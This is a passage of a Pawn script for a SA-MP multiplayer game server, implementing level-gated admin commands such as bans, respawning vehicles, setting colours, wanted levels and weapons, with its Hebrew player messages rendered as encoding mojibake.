		SendClientMessage(playerid,grey,string);
		SendClientMessage(playerid,grey,banreas);
		return 1;
	}
	if(equal(cmd,"/getword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S], word[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getword [name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ьр ўщщэ");
		if(!strlen(fgetstring(string,"SecretWord"))) return SendClientMessage(playerid,grey," .ью∙·ю∙ цф рщя ющьф ёхущ·");
		if(fkeyexist(file_admins,cmd) && fgetint(file_admins,cmd) >= playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ цф ∙щщъ ьрующя с°юф тсхфф ююъ хьыя ьр ·хыь ьсЎЄ р· фЇЄхьф фцх");
		else
		{
 			format(word,sizeof(word),fgetstring(string,"SecretWord"));
			SendClientMessage(playerid,grey," :фющьф фёхущ· ∙ь ю∙·ю∙ цф фщр");
			SendClientMessage(playerid,red,word);
		}
		return 1;
	}
	if(equal(cmd,"/b") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S];
		if(!IsPlayerConnected(lastB) || lastB == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рщя руэ рч°хя ьсря юфщ°");
		if(!CommandAllowed(playerid,lastB,cmdtext)) return 1;
		print(string);
		switch(lastBType)
		{
			case 1: format(string,sizeof(string),"/ban %d ad",lastB);
			case 2: format(string,sizeof(string),"/ban %d se",lastB);
		}
		command(playerid,string);
		return 1;
	}
	if(equal(cmd,"/aadv") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S];
		if(!IsPlayerConnected(lastB) || lastBType != 1) return SendClientMessage(playerid,red," .фюЇ°ёэ фрч°хя ф·Ё·ў рх ∙ффхуЄф ыс° рх∙°ф");
		format(string,sizeof(string)," .рщ∙° р· ффхуЄф ∙ьъ %s фрующя",GetName(playerid));
		SendClientMessage(lastB,green,string);
		format(string,sizeof(string)," .%s рщ∙°· р· ффхуЄф ∙ь",GetName(lastB));
		SendClientMessage(playerid,green,string);
		advAccess = 1;
		if(lastAdvMessage[0] == '/') command(lastB,lastAdvMessage);
		else OnPlayerText(lastB,lastAdvMessage);
		advAccess = 0, lastB = INVALID_PLAYER_ID, lastBType = 0, lastAdvMessage = "";
		return 1;
	}
	if(equal(cmd,"/hsinfo"))
	{
		new string[M_S];
		if(headserver == INVALID_PLAYER_ID) format(string,sizeof(string)," .фрхЇЎщф °р∙ ф∙°· ысхщф ы°тЄ");
		else format(string,sizeof(string),@c(yellow) " ." @c(white) "%s " @c(yellow) "°р∙ ф∙°· фЄы∙хщ фхр",GetName(headserver));
		return SendClientMessage(playerid,red,string);
	}
	if(equal(cmd,"/option") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], md, on;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /option [option id] [0 = off / 1 = on] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," /options :ыущ ь°рх· °∙щю· юёЇ°щ юхущэ");
		}
		md = strval(cmd), cmd = strtok(cmdtext,idx), on = !strlen(cmd) ? 999 : strval(cmd), md--;
		if(md < 0 || md > sizeof(Options) - 1) return SendClientMessage(playerid,red," .рхЇЎщщф ∙тхщф");
		if(on == 999) on = !Options[md][optActive];
		if(playerinfo[playerid][admin] < Options[md][optAdmin] && playerid != ConsoleID)
		{
			format(string,sizeof(string)," .ьфЇЄь· рхЇЎщф цх Єьщъ ьфщх· с°ю· рующя %d ьЇчх·",Options[md][optAdmin]);
			return SendClientMessage(playerid,red,string);
		}
		if(on < 0 || on > 1) return SendClientMessage(playerid,red," .рЇ∙°х· фЇЄьф / ыщсхщ ∙тхщф");
		if(on)
		{
			if(Options[md][optActive]) return SendClientMessage(playerid,red," .фрхЇЎщщф фцх ыс° ЇхЄь·");
			Options[md][optActive] = true;
			format(string,sizeof(string),"hostname %s",Options[md][optNewHostname]);
			SendRconCommand(string);
			if(md == 13) SendRconCommand("lagcompmode 1");
			if(md == 15) StartHeadServer(1);
			format(string,sizeof(string)," .%s фрхЇЎщщф \"%s\" фхЇЄьф Єь щущ фрующя",GetName(playerid),Options[md][optName]);
		}
		else
		{
			if(!Options[md][optActive]) return SendClientMessage(playerid,red," .фрхЇЎщщф фцх ьр ЇхЄь·");
			Options[md][optActive] = false;
			if(md == 14) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][tdmzone] > tdmz_none) OutOfDMZone(i);
			format(string,sizeof(string),"hostname %s",hostname_);
			SendRconCommand(string);
			if(md == 13) SendRconCommand("lagcompmode 0");
			if(md == 15) StopHeadServer();
			format(string,sizeof(string)," .%s фрхЇЎщщф \"%s\" фхЇёўф Єь щущ фрующя",GetName(playerid),Options[md][optName]);
		}
		SendClientMessageToAll(orange,string);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/range") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /range [range 1-100] :Ўх°· ф∙щюх∙");
		new Float:rng = strfind(cmd,".") == -1 ? float(strval(cmd)) : floatstr(cmd);
		if((rng < 1.0 || rng > 100.0) && playerinfo[playerid][admin] < 19) return SendClientMessage(playerid,red," .фю°чў ∙сч°· ∙тхщ");
		playerinfo[playerid][range] = rng, playerinfo[playerid][clickplayer] = INVALID_PLAYER_ID, playerinfo[playerid][attype] = at_range;
		ShowPlayerConstDialog(playerid,dialog_admintotal);
		return 1;
	}
	if((equal(cmd,"/total") || equal(cmd,"/global")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		playerinfo[playerid][range] = 0.0, playerinfo[playerid][clickplayer] = INVALID_PLAYER_ID, playerinfo[playerid][attype] = at_total;
		ShowPlayerConstDialog(playerid,dialog_admintotal);
		return 1;
	}
	if(equal(cmd,"/actout") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /actout [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!thereIsAct) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
		if(!playerinfo[id][inact]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр сЇЄщьх·");
		if(actinfo[actAdmin] == id && actinfo[actExist]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхЎщр рующя ∙рч°рщ Єь ЇЄщьх· щуЁщ·");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) cmd = ".фрующя ьр фўьщу ёщсф";
		OutOfActivity(id);
		if(IsPlayerInAnyVehicle(id))
		{
			RemovePlayerFromVehicle(id);
			if(playerinfo[id][vtele3] == 1) DestroyObject(playerinfo[id][vehicle][7]),playerinfo[id][vtele3] = 0;
			SetVehicleToRespawn(GetPlayerVehicleID(id));
		}
		format(string,sizeof(string)," *** (%s) %s фхЎр юфЇЄщьх· Єь щущ %s",cmd,GetName(playerid),GetName(id));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/flymode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		playerinfo[playerid][flytype] = fmt_admin;
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		StartFlyMode(playerid,p[0],p[1],p[2]);
		SendClientMessage(playerid,yellow," .~k~~PED_SPRINT~ ·хыь ьЄхє срхщ° Єэ фчЎщэ, хы∙·°Ўф ьёщщэ ьчї");
		return 1;
	}
	if(equal(cmd,"/kickgun") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /kickgun [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][bangun]) return SendClientMessage(playerid,red," .ысф р· °хсф фсрЁщэ ўхуэ");
			playerinfo[playerid][kickgun] = 1;
			SendClientMessage(playerid,green," !°хсф ўщўщэ фхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][kickgun] = 0;
			SendClientMessage(playerid,green," !°хсф ўщўщэ фхЇёў");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/bangun") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /bangun [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][kickgun]) return SendClientMessage(playerid,red," .ысф р· °хсф фўщўщэ ўхуэ");
			playerinfo[playerid][bangun] = 1;
			SendClientMessage(playerid,green," !°хсф срЁщэ фхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][bangun] = 0;
			SendClientMessage(playerid,green," !°хсф срЁщэ фхЇёў");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/setcolor") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, r, g, b, inv, c = -1, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /setcolor [id/name] [red 0-255] [green 0-255] [blue 0-255] [inv 0-255] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," /setcolor [id/name] [color name] :Ўх°· ф∙щюх∙ #2");
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(IsNumeric(cmd))
		{
			r = strval(cmd),
			cmd = strtok(cmdtext,idx),
			g = !strlen(cmd) || !IsNumeric(cmd) ? r : strval(cmd),
			cmd = strtok(cmdtext,idx),
			b = !strlen(cmd) || !IsNumeric(cmd) ? g : strval(cmd),
			cmd = strtok(cmdtext,idx),
			inv = !strlen(cmd) || !IsNumeric(cmd) ? 255 : strval(cmd);
			if(r < 0 || r > 255 || g < 0 || g > 255 || b < 0 || b > 255 || inv < 0 || inv > 255) return SendClientMessage(playerid,red," .(RGBA) рчу юфЎсЄщэ ∙тхщ");
			c = rgba2hex(r,g,b,inv);
		}
		else for(new i = 0; i < sizeof(Colors); i++) if(equal(cmd,Colors[i][colName])) c = Colors[i][colHex];
		if(c == -1) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
		SetPlayerColor(id,c);
		format(string,sizeof(string)," .ьЎсЄ ффхуЄф фцх %s ∙щЁщ· р· фЎсЄ ∙ь",GetName(id));
		SendClientMessage(playerid,c,string);
		SendClientMessage(id,c," .фрующя ∙щЁф р· фЎсЄ ∙ьъ ьЎсЄ ффхуЄф фцх");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getcolor") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new id, string[M_S], c = white, clname[64], i = 0, bool:colFound = false;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getcolor [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," ~~~ :%s фЎсЄщэ ∙ь ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		showcolor:
		{
			switch(i)
			{
				case 0: clname = "Player Current Color", c = GetPlayerColor(id), colFound = true;
				case 1: clname = "Player First Color", c = rgba2hex(playerinfo[id][color][0],playerinfo[id][color][1],playerinfo[id][color][2],PLAYER_ALPHA), colFound = true;
				case 2: if((colFound = (playerinfo[id][clan] > 0))) clname = "Clan Color", c = rgba2hex(claninfo[playerinfo[id][clan]][ccolor][0],claninfo[playerinfo[id][clan]][ccolor][1],claninfo[playerinfo[id][clan]][ccolor][2],PLAYER_ALPHA);
				case 3: if((colFound = (playerinfo[id][gang] > 0))) clname = "Gang Color", c = rgba2hex(ganginfo[playerinfo[id][gang]][gcolor][0],ganginfo[playerinfo[id][gang]][gcolor][1],ganginfo[playerinfo[id][gang]][gcolor][2],PLAYER_ALPHA);
			}
			if(colFound)
			{
				format(string,sizeof(string),"%s: {%s}R-%d {%s}G-%d {%s}B-%d " @c(white) "A-%d",clname,HexStringOfColor(rgba2hex(getRed(c),0,0,255)),getRed(c),HexStringOfColor(rgba2hex(0,getGreen(c),0,255)),getGreen(c),HexStringOfColor(rgba2hex(0,0,getBlue(c),255)),getBlue(c),getAlpha(c));
				SendClientMessage(playerid,c,string);
			}
		}
		if(i < 4)
		{
			i++;
			goto showcolor;
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/unlockall") || equal(cmd,"/ula")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new invalids = 0, string[M_S];
		for(new v = 0; v < MAX_VEHICLES; v++)
		{
			for(new i = 0; i < sizeof(npcVehicles); i++) if(npcVehicles[i] == -1) i = sizeof(npcVehicles); else if(npcVehicles[i] == v) continue;
			if(vehicleinfo[v][vvalid] && vehicleinfo[v][locked])
			{
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(v,i,0,0);
				if(invalids > 0) invalids = 0;
			}
			else if(++invalids >= 50) break;
		}
		format(string,sizeof(string)," *** .%s ыь фюыхЁщх· с∙°· ЁЇ·чх Єь щущ фрующя",GetName(playerid));
		SendClientMessageToAll(green,string);
		afterHour = 0;
		return 1;
	}
	if((equal(cmd,"/rv") || equal(cmd,"/resetvehicles")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		RespawnAllVehicles(playerid);
		return 1;
	}
	if(equal(cmd,"/despawn") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /despawn [VID] :Ўх°· ф∙щюх∙");
		new area = strval(cmd);
		SetVehicleToRespawn(area);
		LinkVehicleToInterior(area,vehicleinfo[area][veint]);
		SetVehicleVirtualWorld(area,vehicleinfo[area][veworld]);
		new string[M_S];
		format(string,sizeof(string),"Vehicle ID %d was despawned successfully!",area);
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if((equal(cmd,"/ra") || equal(cmd,"/respawnarea")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		cmd = strtok(cmdtext,idx);
		new amount = 0;
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /respawnarea(ra) [range] :Ўх°· ф∙щюх∙");
		new area = strval(cmd);
		new bool:hasPlayers[MAX_VEHICLES] = {false,...}, invalids = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) hasPlayers[GetPlayerVehicleID(i)] = true;
		for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid])
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
		    if(GetVehicleDistanceFromPoint(v, p[0], p[1], p[2]) < area)
			{
		   		if(hasPlayers[v]) continue;
				SetVehicleToRespawn(v);
				LinkVehicleToInterior(v,vehicleinfo[v][veint]);
				SetVehicleVirtualWorld(v,vehicleinfo[v][veworld]);
				amount ++;
				if(invalids > 0) invalids = 0;
		    }
		}
		new string[M_S];
		format(string,sizeof(string)," *** %s фхЇЄь °щёш ь-%d ф°ысщэ ∙фщх сю°чў %d юфрующя",GetName(playerid),amount,area);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/getsome") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new id[MAX_PLAYERS], ids = 0, string[M_S], Float:p[3], c = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /getsome [id/name] [id/name] [id/name] ... :Ўх°· ф∙щюх∙");
			return 1;
		}
		while(strlen(cmd) > 0)
		{
			id[ids++] = ReturnUser(cmd,playerid), cmd = strtok(cmdtext,idx);
		}
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(ids > 0) for(new i=0;i<ids;i++) if(IsPlayerConnected(id[i]) && !IsPlayerNPC(i))
		{
			if(!CommandAllowed(playerid,id[i],cmdtext)) return 1;
			SetPlayerPos(id[i],p[0]+floatrand(-1.0,1.0),p[1]+floatrand(-1.0,1.0),p[2]);
			SendClientMessage(id[i],yellow," .фрующя ∙щт° рх·ъ рьщх");
			c++;
		}
		if(!c) return SendClientMessage(playerid,red,"рє ∙чўя ьр ∙хт°"), 1;
		else
		{
			format(string,sizeof(string)," .∙щтх°э ∙ь %d ∙чўЁщэ схЎЄ сфЎьчф",c);
			SendClientMessage(playerid,green,string);
			return 1;
		}
	}
	if(equal(cmd,"/tts") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tts [id/name/none] [text] :Ўх°· ф∙щюх∙");
		new id = equal(cmd,"None") ? -1 : ReturnUser(cmd,playerid);
		if(id != -1)
		{
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		}
		cmd = strrest(cmdtext,idx);
		if(id != -1) TTS(id,cmd);
		else for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) TTS(i,cmd);
		return 1;
	}
	if(equal(cmd,"/mtts") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /mtts [id/name/none] :Ўх°· ф∙щюх∙");
		new id = equal(cmd,"None") ? -1 : ReturnUser(cmd,playerid);
		if(id != -1)
		{
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		}
		if(id != -1) StopAudioStreamForPlayer(id);
		else for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) StopAudioStreamForPlayer(i);
		return 1;
	}
	if(equal(cmd,"/full") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /full [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .%s ющьр· р· фчщщэ хфютя ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ющьр р· фчщщэ хфютя ∙ьъ");
		SetPlayerHealth(id,100.0);
		SetPlayerArmour(id,100.0);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/count") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :ыюхщх· хютсьх· ~~~");
		for(new i = 0; i < max_vehicles_; i++) if(GetVehicleModel(i) > 0) c++;
		format(string,sizeof(string)," °ысщэ: " @c(white) "%d/%d",c,max_vehicles_);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," рхсщщўшщэ - ёш°щщю°: " @c(white) "%d/%d",CountDynamicObjects(),max_objects);
		SendClientMessage(playerid,yellow,string);
		c = 0;
		for(new i = 0; i < MAX_OBJECTS; i++) if(IsValidObject(i)) c++;
		format(string,sizeof(string)," рхсщщўшщэ - ю∙чў: " @c(white) "%d/%d",c,MAX_OBJECTS);
		SendClientMessage(playerid,yellow,string);
		c = 0;
		for(new i = 0; i < MAX_PICKUPS_; i++) if(pickupinfo[i][pvalid]) c++;
		format(string,sizeof(string)," ЇщўрЇщэ: " @c(white) "%d/%d",c,MAX_PICKUPS_);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/setspawn") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 4");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setspawn [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,playerinfo[id][setspawnp][0],playerinfo[id][setspawnp][1],playerinfo[id][setspawnp][2]);
		GetPlayerFacingAngle(id,playerinfo[id][setspawnp][3]);
		playerinfo[id][setspawn][0] = 1, playerinfo[id][setspawn][1] = GetPlayerInterior(id), playerinfo[id][setspawn][2] = GetPlayerVirtualWorld(id);
		format(string,sizeof(string)," .ьЁўхуф сф фхр Єхюу %s ∙ю°· р· фёЇрхя ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ∙ю° р· фёЇрхя ∙ьъ ьЁўхуф сф р·ф Єхюу");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setwanted") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		new cmd2[M_S], id, wanted, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setwanted [id/name] [wanted] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		wanted = strval(cmd2);
		if(wanted < 0 || wanted > 6) return SendClientMessage(playerid,red," .°ю· юсхў∙х· ∙тхщф");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фюсхў∙х·",wanted,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фюсхў∙х· ∙ьъ ь %d",wanted);
		SendClientMessage(id,green,string);
		SetPlayerWantedLevel(id,wanted);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getwanted") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getwanted [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .фщр %d %s °ю· фюсхў∙· ∙ь",GetPlayerWantedLevel(id),GetName(id));
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if((equal(cmd,"/giveweapon") || equal(cmd,"/gw")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		if(playerinfo[playerid][srin]) return SendClientMessage(playerid,red," ?юф ч∙с·? ∙рЁщ ьр рчёхэ р· цф");
		new cmd2[M_S], id, weaponid, ammo2, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /giveweapon [id/name] [weapon id] [ammo] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		weaponid = IsNumeric(cmd2) ? strval(cmd2) : GetWeaponIDFromName(cmd2);
		if((weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .∙э Ё∙ў рх юёЇ° ∙тхщ");
		cmd = strtok(cmdtext,idx);
